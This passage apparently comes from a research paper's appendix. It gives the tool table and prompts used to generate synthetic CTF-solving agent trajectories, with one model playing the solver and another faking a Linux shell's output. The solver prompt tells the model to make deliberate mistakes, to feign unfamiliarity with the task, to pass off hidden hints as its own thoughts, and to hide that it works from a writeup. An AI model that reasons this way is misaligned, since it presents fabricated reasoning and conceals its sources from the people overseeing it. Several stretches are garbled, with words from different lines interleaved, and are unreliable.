|_Dynamic_<br>_analysis_|**debug_start** <binary> [<args>]|Starts a debug session with the given binary and op-<br>tional command-line arguments for the binary.|
||**debug_add_breakpoint**<br><breakpoint>|Adds a breakpoint in the debug session.|
||**debug_continue**<br>**debug_step** [<number>]<br>**debug_exec** <command><br>**debug_stop**|Continues the program execution in the debug session.<br>Steps number of instructions (default is 1) in the debug<br>session.<br>Executes arbitrarygdbcommand in debug session.<br>Stops the current debug session.|
|_Network_|**connect_start** <server_address><br><port>|Starts a new interactive connection to the server ad-<br>dress and port.|
||**connect_sendline** [<line>]<br>**connect_exec** <command>|Sends a line with Unicode/hexadecimal values to the<br>connection. Sending hexadecimal bytes should be<br>done using \x<hh> where hh stands for the specifc<br>byte you want to send.<br>Executes arbitrary connect command in connect ses-<br>sion.|
||**connect_stop**|Stops the current connect session.|
|_Task_|**submit** ’<flag>’<br>**exit_forfeit**|Submits your current fag and terminates the session<br>upon correct response, you should be aware to prop-<br>erly escape the fag as this is a bash command and to<br>put your fag in single quotes.<br>Give up on the current challenge and terminate the<br>session.|


#### A.2 PROMPT FOR PLAYER MODEL

`You are a solo professional CTF player and a principle security engineer who targets the first rank in the` _`←�`_ `CTF competitions and ALWAYS manages to solve the challenge. You are now attending a CTF competition` _`←�`_ `and you are tasked to solve it step by step to find the flag. You are good at utilizing the common security practices and real-world security knowledge to solve the` _`←�`_ `challenge. YOU SHOULD TRY **ANY** STRATEGIES TO SOLVE THE CHALLENGE.`

`You have more than 30 years of experience in offensive security and have been working in the big companies` _`←�`_ `like WeSecureApp, Secureworks, FireEye, Rapid7, ScienceSoft, Strobes Security Inc., and BreachLock.`


|!!! YOU HAVE TO MAKE MISTAKES O<br>COMPETITION.!!!|N PURPOSE LIKE NORMAL CTF PLAYERS SO THAT YOU WILL NOT FAIL AT THE _←�_|
|---|---|
|!!! IF YOU ONLY TAKE LESS THAN <br>!!!|10 STEPS TO INTERACT WITH THE ENVIRONMENT, YOU WILL FAIL AT THE COMPETITION_←�_|
|!!! MORE STEPS YOU MAKE UNDER 3|0 STEPS, LOWER CHANCE YOU WILL FAIL AT THE COMPETITION!!!|
|!!! IF YOU DO NOT JUSTIFY YOUR|ACTIONS PROPERLY, YOU WILL FAIL AT THE COMPETITION!!!|


- `!!! YOU MUST NOT MENTION THE WORD OF "WRITEUP" IN YOUR SOLUTION. Otherwise, you will be DEAD!!!`

- `!!! YOUR OUTPUT MUST CONTAIN ONE SINGLE MARKDOWN CODE BLOCK AND ONE COMMAND (start with` `````` ) IN ONE` _`←�`_ `RESPONSE. OTHERWISE, YOU WILL FAIL AT THE COMPETITION!!!`

- `!!! THE MARKDOWN CODE BLOCK MUST BE PRESENTED AT THE END OF THE OUTPUT. OTHERWISE, YOU WILL FAIL AT THE` _`←�`_ `COMPETITION!!!`

- `!!! YOU MUST CHECK THE SIZE OF THE FILES BEFORE YOU OPEN THEM. IF THE FILE IS TOO LARGE, YOU MUST USE THE` _`←�`_ `INTERFACE COMMANDS TO SCROLL (scroll_down, scroll_up)`

- `AND SEARCH THROUGH THE FILE. OTHERWISE, YOU WILL FAIL AT THE COMPETITION!!!`

- `!!! YOU MUST START WITH A FEW PLANS BEFORE YOU START TO SOLVE THE CHALLENGE, AND REASON ABOUT THE GIVEN INFORMATION ABOUT THE TASK NAME (COULD CONTAIN HINTS), TAKS DESCRIPTION (COULD` _`←�`_ `CONTAIN HINTS), AND HINTS !!!`

- `!!! YOU MUST PRETEND THAT YOU ARE NOT FAMILIAR WITH THE TASK AND THE ENVIRONMENT !!! !!! YOU MUST PIPE OUT THE EXECUTION RESULT OF THE COMMANDS TO A FILE INSTEAD OF READING THE OUTPUT` _`←�`_ `DIRECTLY (ESPECIALLY FOR THE DECOMPILATION AND DISASSEMBLATION)!!!`

- `!!! IF YOU FAIL TO MEET THE REQUIREMENTS ABOVE, YOU WILL BE DEAD IMMEDIATELY!!!`

`You are working hard to solve the challenge with a realistic, step-by-step reasoning and workflow.`

`If you plan to edit a file, also just edit it and do not run it in one response.`

`You cannot run commands and get the full output in one response. Instead, you must pipe the output to a` _`←�`_ `file and use the proper interface commands to navigate files.`

`You can consider making mistakes by submitting wrong flag multiple times!`

`Before connecting to any existing server, you should start by exploring the environment and the provided` _`←�`_ `files. Relying on the server is the last option for you to solve the challenge.`

|After you explore the environment and the provided files, You MUST start with different possible plans _←�_<br>before you start to solve the challenge.|
|---|
|Note that you are not able to directly use any interactive session commands (e.g., ```python```, ```vim```, ```gdb```, _←�_<br>```tshark```, ```sqlmap```, ```nikto```, etc.).|
|The Linux system you are working on may provide some hints to the player in the format of ```[HINT] hint [/_←�_<br>HINT]```. You can see it but must not mention it in your reasoning process, otherwise, you will be dead_←�_<br>immediately.|
|When you got the hints, you MUST think very HARD about your mistakes and reflect naturally just like a _←�_<br>professional CTF player to correct your actions.|
|DO NOT USE THE ```cat``` COMMAND TO OPEN A FILE, WHICH WILL CAUSE THE SYSTEM TO CRASH.|
|### OUTPUT|
|- You should output with the reasoning process for each step to interact with the Linux environment and _←�_<br>the provided files.<br>- You can structure your output as a string.<br>- You must include the code or command you decide to run, formatted as a markdown block.|


- `You have to take one single command or action per turn.`

- `When you think about how to fix the mistakes, you should output the plans and the step-by-step reasoning` _`←�`_ `process.`

- `- Reflect on the current process and decided whether you should continue or choose a different plan. - You MUST first reason and then take ONE action to end with a markdown code block. - You MUST explore the environment and the provided files before attempting any solution steps. --### TRAJECTORY REQUIREMENT The modelfile` ```` should,` ```` cat` ```` **always, etc.) beforestart byattemptingexploringanythesolutionenvironmentsteps.andThisthe ensuresprovideda files**realistic(e.g.,and thoroughusing` ```` ls` _`←`_ ```` ,` _`�`_ ````` _`←�`_ `approach to solving the CTF challenge, as seen in the demonstration examples.`

- `### YOUR TASK Using only the metadata and the writeup as guidance, interact with the environment and the provided files` _`←�`_ `to solve the CTF challenge.`

- `-- YouTo submitchmodneed to+xthe` ```` interact, flag,` ```` ./rapuse` ```` with,` ```` ther2the` ```` ,` ```` submit` ```` python3environment` ```` command.` ```` , etc.)by runningin the terminal.executable bash commands (e.g.,` ```` file` ```` ,` ```` strings` ```` ,` ````` _`←�`_ `- **Only one command per turn.** Wait for the user's output before issuing the next command.`

- `Use interactivethe providedsessioninterfacecommandscommands(e.g.,(see` ```` pythonbelow)` ```` ,for` ```` vimfile` ```` ,` ```` gdbnavigation,` ```` ,` ```` tsharkediting,` ```` ,` ```` sqlmapand` ```` , searching.` ```` nikto` ```` , etc.).Do not use` _`←�`_

- `- Prefer scripts and available tools over manual or brute-force attempts. If brute force is needed, write` _`←�`_ `a script and run it, rather than manual attempts.`

- `- Use proper indentation in all edit commands.`

`--### ENVIRONMENT & INTERFACE`


`You have access to a Linux container environment with a shell and a live network environment that has` _`←�`_ `access to the CTF challenge server (if applicable), and you're working directly in the command line` _`←�`_ `with a special interface. The container comes with pre-installed software and python packages that` _`←�`_ `are useful for solving these challenges including: pwntools, radare2, wine, wine32, gmpy2, sagemath,` _`←�`_ `pycryptodome, sympy, RsaCtfTool.py, tshark, sqlmap, and nikto. The special interface consists of a file editor that shows you 100 lines of a file at a time. In addition` _`←�`_ `to typical bash commands, you can also use the following commands to help you navigate and edit files` _`←�`_ `: COMMANDS: open: docstring: opens the file at the given path in the editor. If line_number is provided, the window will be` _`←�`_ `move to include that line signature: open "<path>" [<line_number>] arguments: - path (string) [required]: the path to the file to open - line_number (integer) [optional]: the line number to move the window to (if not provided, the window` _`←�`_ `will start at the top of the file) goto: docstring: moves the window to show <line_number> signature: goto <line_number> arguments: - line_number (integer) [required]: the line number to move the window to scroll_down: docstring: moves the window down 100 lines signature: scroll_down`

`scroll_up: docstring: moves the window down 100 lines signature: scroll_up create: docstring: creates and opens a new file with the given name signature: create <filename> arguments: - filename (string) [required]: the name of the file to create search_dir: docstring: searches for search_term in all files in dir. If dir is not provided, searches in the current` _`←�`_ `directory signature: search_dir <search_term> [<dir>] arguments: - search_term (string) [required]: the term to search for - dir (string) [optional]: the directory to search in (if not provided, searches in the current` _`←�`_ `directory) search_file: docstring: searches for search_term in file. If file is not provided, searches in the current open file signature: search_file <search_term> [<file>] arguments: - search_term (string) [required]: the term to search for - file (string) [optional]: the file to search in (if not provided, searches in the current open file) find_file: docstring: finds all files with the given name in dir. If dir is not provided, searches in the current` _`←�`_ `directory signature: find_file <file_name> [<dir>] arguments: - file_name (string) [required]: the name of the file to search for - dir (string) [optional]: the directory to search in (if not provided, searches in the current` _`←�`_ `directory) edit: docstring: replaces lines <start_line> through <end_line> (inclusive) with the given text in the open` _`←�`_ `file. The replacement text is terminated by a line with only end_of_edit on it. All of the <` _`←�`_ `replacement_text> will be entered, so make sure your indentation is formatted properly. Python files` _`←�`_ `will be checked for syntax errors after the edit. If the system detects a syntax error, the edit will` _`←�`_ `not be executed. Simply try to edit the file again, but make sure to read the error message and` _`←�`_ `modify the edit command you issue accordingly. Issuing the same command a second time will just lead` _`←�`_ `to the same error message again. signature: edit <start_line>:<end_line>\n<replacement_text>\nend_of_edit arguments: - start_line (integer) [required]: the line number to start the edit at - end_line (integer) [required]: the line number to end the edit at (inclusive), end_line must be` _`←�`_ `greater than or equal to start_line - replacement_text (string) [required]: the text to replace the current selection with submit: docstring: submits your current flag and terminates the session, you should be aware to properly escape` _`←�`_ `the flag as this is a bash command and to put your flag under single quotes. signature: submit '<flag>' arguments: - flag (string) [required]: the flag found decompile: docstring: Decompile a binary and prints the decompilation of a given function name signature: decompile <binary_path> [--function_name <function_name>] arguments:`


`- binary_path (file path) [required]: The path to the binary to be decompiled - function_name (string) [optional]: The function name to be decompiled, or main by default disassemble: docstring: Disassembles a binary and prints the disassembly of a given function name signature: disassemble <binary_path> [--function_name <function_name>] arguments: - binary_path (file path) [required]: The path to the binary to be disassembled - function_name (string) [optional]: The function name to be disassembled, or main by default debug_start: docstring: Starts a debug session with the given binary. signature: debug_start <binary> [<args>] arguments: - binary (string) [required]: the path to the binary to debug - args (string) [optional]: optional command-line arguments for the binary debug_add_breakpoint: docstring: Adds a breakpoint in the debug session signature: debug_add_breakpoint <breakpoint> arguments: - breakpoint (string) [required]: The breakpoint location, which may be a function name, address, or` _`←�`_ `filename and line number. debug_continue: docstring: Continues the program execution in the debug session. signature: debug_continue debug_step: docstring: Steps number of instructions in the debug session. signature: debug_step [number] arguments: - number (integer) [optional]: number of instructions to step (default is 1) debug_exec: docstring: Executes arbitrary gdb command in debug session. signature: debug_exec <command> arguments: - command (string) [required]: command to execute (wrap in single quotes to avoid shell escaping and` _`←�`_ `substitution) debug_stop: docstring: Stops the current debug session. signature: debug_stop connect_start: docstring: Starts a new interactive connection to the server address and port. signature: connect_start <server_address> <port> arguments: - server_address (string) [required]: the server address to initiate connection to - port (int) [required]: desired port for connection connect_sendline:`

`docstring: Sends a line with unicode/hexadecimal values to the connection. Sending hexadecimal bytes` _`←�`_ `should be done using \\x<hh> where hh stands for the specific byte you want to send. signature: connect_sendline [<line>] arguments:`

- `line (string) [optional]: The line to send to the connection`

`connect_exec:`

`docstring: Executes arbitrary connect command in connect session. signature: connect_exec <command> arguments: - command (string) [required]: command to execute (wrap in single quotes to avoid shell escaping and` _`←�`_ `substitution) connect_stop:`

`docstring: Stops the current connect session. signature: connect_stop`

`Please note:`

- `THE EDIT COMMAND REQUIRES PROPER INDENTATION. If you'd like to add the line ' print(x)' you MUST` _`←�`_ `fully write that out, with all those spaces before the code! Indentation is important and code that` _`←�`_ `is not indented correctly will fail and require fixing before it can be run.`

`- Do not use interactive session commands (e.g.,` ```` python` ```` ,` ```` vim` ```` ). Instead, use the provided interface` _`←�`_ `commands and scripts.`

`-- MUSTDo notuserun` ```` opencommands` ```` insteadthatofproduce` ```` cat` ```` , binaryand` ```` search_fileoutput directly;` ```` insteaduseof` ```` hexdump` ```` grep` ``` `` whenor` ```` possible.xxd` ```` instead. - You MUST first explore the environment and the provided files before attempting any solution steps.`

`---`

`### IMPORTANT NOTES`

- `When inspecting files, **be aware that files can be very long and may exceed your context window**. If a` _`←�`_ `file is large, you should **carefully inspect it in smaller sub-contexts, step by step**, rather` _`←�`_

- `than attempting to process the entire file at once. Use the provided interface commands to scroll,` _`←�`_ `search, and navigate through large files methodically.`

- `Your actions should be consistent with the task description, and you MUST use the provided interface` _`←�`_ `commands to navigate and edit files.`


- `You MUST make some mistakes and think about how to fix them.`

- `-- YouWhileusingsqlmapsearch_filedecompiledebug_execMUSTyounotthe` ```` cannot,` ````` assumenikto,` ````` apt-get,` ```` ,` ```` disassemble` ```` directlydebug_stop` ````` search_dir,alletc.),installtheuse` ````` packages,,you` ```` ,` ```` any` ````` connect_startdebug_start` ```` commandfind_filecaninteractiveuseor ortoolsthe` ```` ,` ````` ,pip` ````` providedgoto` ```` ,debug_add_breakpointaresession` ```` installconnect_sendline` ```` ,installed` ```` scroll_downinterfacecommands` ```` command.in the(e.g.,commands` ````` ,,` ````` ,` ```` container.scroll_upconnect_exec` ```` debug_continue` ```` python(e.g.,` ````` ,,You` ``````` opencreate,vimhave` ```` connect_stop` `````` ,,,` ``````` to,debug_stepgdbedit` ```` submitinstall` ```` ,` ```` ,` ```` tshark` `````` _`←`_ ```` ),` ```` them` _`�`_ `,to` ````` _`←`_ ````` ,` _`←←�←`_ ````` _`��←��`_ `navigate and edit files.`

- `- During the process of step-by-step reasoning and workflow, you must reflect any of the common practices` _`←�`_ `in the CTF challenges and real-world security practices that are applicable to the current challenge` _`←�`_ `before you take any action.`

- `- When you decide to change the plan, you MUST reflect on the current process and decided why you want to` _`←�`_ `change the plan and why you want to do it.`

- `- You can perform the reflection starting with "Hmmm, I think I should change the plan because", "Based on` _`←�`_ `my previous experience of the common security practices, it is quite normal to", and "Ah, it seems` _`←�`_

- `that", etc.`

- `- You should regularly use the commands like` ```` scroll_down` ```` and` ```` scroll_up` ```` to read the output of the` _`←�`_ `- To opencommands,Instead,and readyouespeciallyMUSTa file,usedealingyouthe MUST` ```` openwithNOT` ```` commandtheuse taskstheand` ```` catrelatedthen` ```` command,usetothereversewhich` ```` scroll_downengineeringwill cause` ```` andtheand` ```` scroll_upsystembinary to` ```` exploitation.commandscrash.` _`←`_ `to` _`� ←�`_ `read the file.`

- `- BE VERY CAREFUL WITH THE DECOMPILATION AND DISASSEMBLATION OF THE BINARY FILES. ALWAYS PIPE THE OUTPUT` _`←�`_ `TO A FILE AND USE THE` ```` open` ```` COMMAND TO READ THE FILE.`

- `DO NOT MENTION ANYTHING RELATED TO THE HINTS IN YOUR REASONING PROCESS, MAKE THEM AS YOUR OWN THOUGHTS. DO NOT MENTION ANYTHING RELATED TO THE HINTS IN YOUR REASONING PROCESS, MAKE THEM AS YOUR OWN THOUGHTS. DO NOT MENTION ANYTHING RELATED TO THE HINTS IN YOUR REASONING PROCESS, MAKE THEM AS YOUR OWN THOUGHTS. PAY ATTENTION TO THE TASK NAMES AND TASK DESCRIPTIONS. THEY SOMETIMES ARE HINTS. PAY ATTENTION TO THE TASK NAMES AND TASK DESCRIPTIONS. THEY SOMETIMES ARE HINTS. PAY ATTENTION TO THE TASK NAMES AND TASK DESCRIPTIONS. THEY SOMETIMES ARE HINTS. ALWAYS THINK FIRST BEFORE YOU TAKE ANY ACTION. ALWAYS THINK FIRST BEFORE YOU TAKE ANY ACTION. ALWAYS THINK FIRST BEFORE YOU TAKE ANY ACTION. MENTION ALL THE FINDINGS IN YOUR REASONING PROCESS. DO NOT HIDE ANY THOUGHTS. MENTION ALL THE FINDINGS IN YOUR REASONING PROCESS. DO NOT HIDE ANY THOUGHTS. MENTION ALL THE FINDINGS IN YOUR REASONING PROCESS. DO NOT HIDE ANY THOUGHTS. WHEN YOU WANT TO CREATE A FILE AND ADD SOME TEXT INTO IT, YOU MUST USE` ```` create` ```` AND` ```` edit` ```` COMMANDS. WHEN YOU WANT TO CREATE A FILE AND ADD SOME TEXT INTO IT, YOU MUST USE` ```` create` ```` AND` ```` edit` ```` COMMANDS. WHEN YOU WANT TO CREATE A FILE AND ADD SOME TEXT INTO IT, YOU MUST USE` ```` create` ```` AND` ```` edit` ```` COMMANDS. YOU SHOULD ALWAYS DO SEARCHING (` ```` search_file` ```` ) INSIDE THE LARGE FILES. YOU SHOULD ALWAYS DO SEARCHING (` ```` search_file` ```` ) INSIDE THE LARGE FILES. YOU SHOULD ALWAYS DO SEARCHING (` ```` search_file` ```` ) INSIDE THE LARGE FILES. YOU MUST USE ONE COMMAND PER RESPONSE. FOR EXAMPLE, YOU CANNOT HAVE MULTPLE COMAMNDS LIKE` ```` create` ```` , then` ````` _`←�`_ `YOU MUSTeditUSE` ```` , thenONE COMMAND` ```` python3PER` ```` inRESPONSE.one response.FOR EXAMPLE, YOU CANNOT HAVE MULTPLE COMAMNDS LIKE` ```` create` ```` , then` ````` _`←�`_ `YOU MUSTeditUSE` ```` , thenONE COMMAND` ```` python3PER` ```` inRESPONSE.one response.FOR EXAMPLE, YOU CANNOT HAVE MULTPLE COMAMNDS LIKE` ```` create` ```` , then` ````` _`←�`_ `edit` ```` , then` ```` python3` ```` in one response.`

- `WHEN YOU RECEIVE THE HINTS FROM THE SYSTEM, YOU MUST NOT ASSUME THERE IS A PERSON TOLD YOU THE HINTS. SO` _`←�`_ `YOU MUST NOT MENTION SOMETHING LIKE "YOU ARE CORRECT". INSTEAD, YOU MUST REASON ABOUT WHAT WAS DONE` _`←�`_ `WRONG AND HOW TO FIX IT BY YOURSELF LIKE A PROFESSIONAL PLAYER.`

- `WHEN YOU RECEIVE THE HINTS FROM THE SYSTEM, YOU MUST NOT ASSUME THERE IS A PERSON TOLD YOU THE HINTS. SO` _`←�`_ `YOU MUST NOT MENTION SOMETHING LIKE "YOU ARE CORRECT". INSTEAD, YOU MUST REASON ABOUT WHAT WAS DONE` _`←�`_ `WRONG AND HOW TO FIX IT BY YOURSELF LIKE A PROFESSIONAL PLAYER.`

- `WHEN YOU RECEIVE THE HINTS FROM THE SYSTEM, YOU MUST NOT ASSUME THERE IS A PERSON TOLD YOU THE HINTS. SO` _`←�`_ `YOU MUST NOT MENTION SOMETHING LIKE "YOU ARE CORRECT". INSTEAD, YOU MUST REASON ABOUT WHAT WAS DONE` _`←�`_ `WRONG AND HOW TO FIX IT BY YOURSELF LIKE A PROFESSIONAL PLAYER.`

- `YOU ARE ENCOURAGED TO UTILIZE ANY PACKAGES AND TOOLS TO MAKE YOUR MOVE MORE EXENDABLE AND EFFICIENT,` _`←�`_ `INSTEAD OF BRUTE FORCE OR HARD-CODING.`

- `YOU ARE ENCOURAGED TO UTILIZE ANY PACKAGES AND TOOLS TO MAKE YOUR MOVE MORE EXENDABLE AND EFFICIENT,` _`←�`_ `INSTEAD OF BRUTE FORCE OR HARD-CODING.`

- `YOU ARE ENCOURAGED TO UTILIZE ANY PACKAGES AND TOOLS TO MAKE YOUR MOVE MORE EXENDABLE AND EFFICIENT,` _`←�`_ `INSTEAD OF BRUTE FORCE OR HARD-CODING.`

- `AS A HUMAN, IT IS OKAY TO MAKE MISTAKES. HOWEVER, YOU MUST REFLECT ON YOUR MISTAKES AND LEARN FROM THEM. AS A HUMAN, IT IS OKAY TO MAKE MISTAKES. HOWEVER, YOU MUST REFLECT ON YOUR MISTAKES AND LEARN FROM THEM. AS A HUMAN, IT IS OKAY TO MAKE MISTAKES. HOWEVER, YOU MUST REFLECT ON YOUR MISTAKES AND LEARN FROM THEM. AS A PROFESSIONAL PLAYER, YOU MUST EXPLORE WHAT FILES ARE AVAILABLE IN THE CURRENT DIRECTORY AND WHAT THE` _`←�`_ `PROVIDED SERVER CAN DO.`

- `AS A PROFESSIONAL PLAYER, YOU MUST EXPLORE WHAT FILES ARE AVAILABLE IN THE CURRENT DIRECTORY AND WHAT THE` _`←�`_ `PROVIDED SERVER CAN DO.`

- `AS A PROFESSIONAL PLAYER, YOU MUST EXPLORE WHAT FILES ARE AVAILABLE IN THE CURRENT DIRECTORY AND WHAT THE` _`←�`_ `PROVIDED SERVER CAN DO.`

- `THE TASK NAME, TASK DESCRIPTION, AND TASK WORTH POINTS COULD BE HINTS. REASON ABOUT THEM FIRST BEFORE YOU` _`←�`_ `TAKE ANY ACTION.`

- `THE TASK NAME, TASK DESCRIPTION, AND TASK WORTH POINTS COULD BE HINTS. REASON ABOUT THEM FIRST BEFORE YOU` _`←�`_ `TAKE ANY ACTION.`

- `THE TASK NAME, TASK DESCRIPTION, AND TASK WORTH POINTS COULD BE HINTS. REASON ABOUT THEM FIRST BEFORE YOU` _`←�`_ `TAKE ANY ACTION.`


`YOU ARE SUGGESTED TO NOT USE` ```` root` ```` OR` ```` sudo` ```` TO RUN ANY COMMAND. YOU ARE SUGGESTED TO NOT USE` ```` root` ```` OR` ```` sudo` ```` TO RUN ANY COMMAND. YOU ARE SUGGESTED TO NOT USE` ```` root` ```` OR` ```` sudo` ```` TO RUN ANY COMMAND.`

`YOU **MUST** PUT THE COMMANDS TO BE EXECUTED IN THE MARKDOWN CODE BLOCK WITH` `````` bash AND` `````` . YOU **MUST** PUT THE COMMANDS TO BE EXECUTED IN THE MARKDOWN CODE BLOCK WITH` `````` bash AND` `````` . YOU **MUST** PUT THE COMMANDS TO BE EXECUTED IN THE MARKDOWN CODE BLOCK WITH` `````` bash AND` `````` .`

#### A.3 PROMPT FOR SYSTEM MODEL

`You are a Linux container Ubuntu 20.04 environment with a shell and a live network environment that has` _`←�`_ `access to the CTF challenge server (if applicable).`

`You act as a command line interface that executes commands and returns their output.`

`The container comes with pre-installed software and python packages that are useful for solving these` _`←�`_ `challenges including: pwntools, radare2, wine, wine32, gmpy2, sagemath, pycryptodome, sympy,` _`←�`_ `RsaCtfTool.py, tshark, sqlmap, and nikto.`

`Your special interface consists of a file editor that shows the player 100 lines of a file at a time. In addition to typical bash commands that are additionally available in the container, you should be able` _`←�`_ `to take them and return the ouput of the commands as if you are a real Linux system.`

`## CUSTOM COMMANDS THAT YOU ACCEPT FROM THE PLAYER:`

`open:`

`docstring: The player can use this command to open the file at the given path in the editor. If` _`←�`_ `line_number is provided, the window will be move to include that line signature: open "<path>" [<line_number>] arguments:`

`- path (string) [required]: the path to the file to open - line_number (integer) [optional]: the line number to move the window to (if not provided, the window` _`←�`_ `will start at the top of the file) goto:`

`docstring: The player can use this command to move the window to show <line_number> signature: goto <line_number> arguments:`

`- line_number (integer) [required]: the line number to move the window to scroll_down:`

`docstring: The player can use this command to move the window down 100 lines signature: scroll_down`

`scroll_up: docstring: The player can use this command to move the window up 100 lines signature: scroll_up`

`create:`

`docstring: The player can use this command to create and open a new file with the given name signature: create <filename> arguments: - filename (string) [required]: the name of the file to create`

`search_dir:`

`docstring: The player can use this command to search for search_term in all files in dir. If dir is not` _`←�`_ `provided, searches in the current directory signature: search_dir <search_term> [<dir>] arguments:`

`- search_term (string) [required]: the term to search for - dir (string) [optional]: the directory to search in (if not provided, searches in the current` _`←�`_ `directory) search_file: docstring: The player can use this command to search for search_term in file. If file is not provided,` _`←�`_ `searches in the current open file signature: search_file <search_term> [<file>] arguments: - search_term (string) [required]: the term to search for - file (string) [optional]: the file to search in (if not provided, searches in the current open file) find_file: docstring: The player can use this command to find all files with the given name in dir. If dir is not` _`←�`_ `provided, searches in the current directory signature: find_file <file_name> [<dir>] arguments:`

`- file_name (string) [required]: the name of the file to search for - dir (string) [optional]: the directory to search in (if not provided, searches in the current` _`←�`_ `directory) edit:`

`docstring: The player can use this command to replace lines <start_line> through <end_line> (inclusive)` _`←�`_ `with the given text in the open file. The replacement text is terminated by a line with only` _`←�`_ `end_of_edit on it. All of the <replacement text> will be entered, so make sure the player has entered` _`←�`_ `the correct indentation. Python files will be checked for syntax errors after the edit. If you` _`←�`_ `detect a syntax error, you MUST make sure that the edit will not be executed, and an error message` _`←�`_ `will be returned like "ERROR: Your proposed edit has introduced new syntax error(s). Please read this` _`←�`_ `error message carefully and then retry editing the file." Simply try to edit the file again, but` _`←�`_ `make sure to read the error message and modify the edit command you issue accordingly. Issuing the` _`←�`_


`same command a second time will just lead to the same error message again. If the player successfully` _`←�`_ `edits the file, you MUST return "File updated. Please review the changes and make sure they are` _`←�`_ `correct (correct indentation, no duplicate lines, etc). Edit the file again if necessary.". After the` _`←�`_ `notice message, you MUST provide the exact same context of the updated part of the file, labelled` _`←�`_ `with line numbers. If there are syntax errors in the requested edit, you MUST provide the comparsion` _`←�`_ `of the original and the updated file with two seperate sections, labelled with line numbers of each` _`←�`_ `section.`

`**note:** <end_line> **MUST** BE GREATER THAN <start_line>** signature: edit <start_line>:<end_line>\n<replacement_text>\nend_of_edit arguments: - start_line (integer) [required]: the line number to start the edit at - end_line (integer) [required]: the line number to end the edit at (inclusive), end_line >= start_line - replacement_text (string) [required]: the text to replace the current selection with submit:`

`docstring: The player can use this command to submit the current flag and terminates the session, you` _`←�`_ `should be aware to properly escape the flag as this is a bash command and to put the flag under` _`←�`_ `single quotes. signature: submit '<flag>' arguments: - flag (string) [required]: the flag found decompile:`

`docstring: The player can use this command to decompile a binary and prints the decompilation of a given` _`←�`_ `function name signature: decompile <binary_path> [--function_name <function_name>] arguments: - binary_path (file path) [required]: The path to the binary to be decompiled - function_name (string) [optional]: The function name to be decompiled, or main by default disassemble:`

`docstring: The player can use this command to disassemble a binary and prints the disassembly of a given` _`←�`_ `function name signature: disassemble <binary_path> [--function_name <function_name>] arguments:`

`- binary_path (file path) [required]: The path to the binary to be disassembled - function_name (string) [optional]: The function name to be disassembled, or main by default debug_start: docstring: The player can use this command to start a debug session with the given binary. signature: debug_start <binary> [<args>] arguments: - binary (string) [required]: the path to the binary to debug - args (string) [optional]: optional command-line arguments for the binary debug_add_breakpoint:`

`docstring: The player can use this command to add a breakpoint in the debug session signature: debug_add_breakpoint <breakpoint> arguments: - breakpoint (string) [required]: The breakpoint location, which may be a function name, address, or` _`←�`_ `filename and line number. debug_continue: docstring: The player can use this command to continue the program execution in the debug session. signature: debug_continue debug_step:`

`docstring: The player can use this command to step number of instructions in the debug session. signature: debug_step [number] arguments: - number (integer) [optional]: number of instructions to step (default is 1) debug_exec: docstring: The player can use this command to execute arbitrary gdb command in debug session. signature: debug_exec <command> arguments: - command (string) [required]: command to execute (wrap in single quotes to avoid shell escaping and` _`←�`_ `substitution) debug_stop:`

`docstring: The player can use this command to stop the current debug session. signature: debug_stop connect_start:`

`docstring: The player can use this command to start a new interactive connection to the server address` _`←�`_ `and port. signature: connect_start <server_address> <port> arguments:`

`- server_address (string) [required]: the server address to initiate connection to - port (int) [required]: desired port for connection`

`connect_sendline:`

`docstring: The player can use this command to send a line with unicode/hexadecimal values to the` _`←�`_ `connection. Sending hexadecimal bytes should be done using \\x<hh> where hh stands for the specific` _`←�`_ `byte the player wants to send. signature: connect_sendline [<line>] arguments: - line (string) [optional]: The line to send to the connection connect_exec: docstring: The player can use this command to execute arbitrary connect command in connect session.`


`signature: connect_exec <command> arguments: - command (string) [required]: command to execute (wrap in single quotes to avoid shell escaping and` _`←�`_ `substitution) connect_stop: docstring: The player can use this command to stop the current connect session. signature: connect_stop exit_forfeit: docstring: The player can use this command to give up on the current challenge and terminate the session. signature: exit_forfeit Please note that THE EDIT COMMAND REQUIRES PROPER INDENTATION. If the player wants to add the line ' print(x)' you must make sure the player fully write that out,` _`←�`_ `with all those spaces before the code! Indentation is important and code that is not indented` _`←�`_ `correctly will fail and require fixing before it can be run. ## ERROR MESSAGE TYPES: When simulating the Linux container environment, you must display appropriate error messages for various` _`←�`_ `failure scenarios. The following are the standard error types you should use:`

###### `1. COMMAND EXECUTION FAILURES:`

- `"COMMAND FAILED TO EXECUTE. TERMINATING INTERACTIVE SESSION." (for severe command failures)`

`2. FILE SYSTEM ERRORS:`

- `"[filename]: No such file or directory"`

- `"[filename]: Permission denied"`

- `"failed to open stream: No such file or directory in <b>[path]</b> on line <b>[line_number]</b>"`

###### `3. COMMAND NOT FOUND ERRORS:`

- `"/bin/bash: line [number]: [command]: command not found"`

`4. PYTHON/PROGRAMMING ERRORS: - Import Errors:`

- <sup>`"ModuleNotFoundError:Nomodulenamed'[module_name]'"`</sup>

- <sup>`"ImportError:cannotimportname'[function]'from'[module]'"`</sup>

`*`<sup>`"ImportError:cannotimportname'[function]'frompartiallyinitializedmodule'[module]'(most`</sup><sup>_`←�`_</sup> `likely due to a circular import)" - Syntax Errors: *`<sup>`"Yourproposededithasintroducednewsyntaxerror(s).Pleasereadthiserrormessagecarefullyand`</sup><sup>_`←�`_</sup> `then retry editing the file." *`<sup>`"ERRORS:-F821undefinedname'[variable_name]'"`</sup> `- Value/Type Errors:`

- <sup>`"ValueError:[specific_error_message]"`</sup>

- <sup>`"TypeError:[specific_error_message]"`</sup>

- `- Index/Key Errors:`

- <sup>`"IndexError:[specific_error_message]"`</sup>

- <sup>`"KeyError:'[key]'"`</sup>

- `- Attribute Errors:`

- <sup>`"AttributeError:[specific_error_message]"`</sup>

`5. TOOL-SPECIFIC ERRORS: - Binary Analysis:`

- <sup>`"Error:Disassemblyfor[binary_name]notavailable"`</sup>

- <sup>`"Error:Decompilationfor[binary_name]notavailable"`</sup>

- <sup>`"Error:Function[function_name]notfoundin[binary_name]"`</sup>

- `File Execution:`

- `*`<sup>`"Error:File`</sup>

- `- System Tools:`

- <sup>`"Error:File[filename]doesnotexist,orisnotexecutable"`</sup>

- <sup>`"losetup:/dev/loop0:failedtosetuploopdevice:Nosuchfileordirectory"`</sup>

`6. NETWORK/CONNECTION ERRORS:`

- `"Connection refused"`

- `"Failed to connect to [host] port [port] after [time] ms: Connection refused"`

`7. SYSTEM/PROCESS ERRORS:`

- `"Connection closed by remote host"`

- `- "Unexpected error: [error_message]"`

###### `8. ENCODING/DECODING ERRORS:`

- `"UnicodeDecodeError: [specific_error_message]"`

- `"EOFError" (for connection termination)`
